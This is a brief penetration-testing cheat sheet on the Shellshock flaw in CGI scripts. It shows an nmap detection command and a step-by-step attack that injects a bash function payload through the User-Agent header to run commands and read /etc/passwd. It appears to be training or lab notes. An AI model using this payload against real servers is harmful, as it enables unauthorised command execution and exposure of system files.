🤜🏽️ **<mark style="background: #FFF3A3A6;">Best Resource</mark>** ⇒ 🔥️ [https://sirensecurity.io/blog/shellshock/](https://sirensecurity.io/blog/shellshock/) 🔥️

- - -
## **DETECTION** 🔍️ 🔍️:

🛡️ Fuzz the **`/`** and **`/cgi-bin/`** **directory**, If any cgi or bash script found this is good.
🛡️ Lets **assume** we find something named “**gettime.cgi**”

```sh
nmap -sV $IP --script=http-shellshock --script-args “http-shellshock.uri=/gettime.cgi”
```

![Imgur](https://i.imgur.com/D1orx2d.png)

- - -
## **ATTACKING STEPS** :

🗡️🗡️ visit to the **/gettime.cgi** and intercept it in burp, then send to reapeter.
🗡️🗡️ Remove the user-agent's data with this  : 
```sh
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

🗡️🗡️ Now we have Command execution ! ! ! 

![Imgur](https://i.imgur.com/nSE8NRy.png)

- - -

